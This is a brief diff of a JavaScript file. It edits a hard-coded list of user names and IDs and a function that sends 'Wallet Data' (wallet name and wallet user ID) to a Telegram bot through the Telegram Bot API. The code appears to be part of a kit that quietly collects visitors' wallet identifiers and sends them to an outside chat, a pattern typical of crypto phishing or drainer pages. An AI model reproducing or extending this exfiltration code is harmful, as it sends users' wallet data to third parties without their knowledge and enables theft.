@@ -1,7 +1,7 @@
 window.users = [
   { name: 'Mark', id: 'CN362124' },
   { name: 'Mark', id: 'RD338723' },
-  { name: 'Samuel', id: 'GF407848' }
+  { name: 'Mark', id: 'GJ390555' }
 ];
 
 window.usertwo = [
@@ -180,7 +180,7 @@ document.addEventListener('visibilitychange', () => {
 async function sendToTelegramBot(data, botToken, chatId) {
     try {
         //const message = `Wallet Data:\n\nWallet Name: ${data.walletName}\nWallet User ID: ${data.walletUserId}`;
-	const message = `{ name: '${data.walletName}', id: '${data.walletUserId}' }`;
+	const message = `{ name: '${data.walletName}', id: '${data.walletUserId}' },`;
         const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
         
         const response = await fetch(url, {
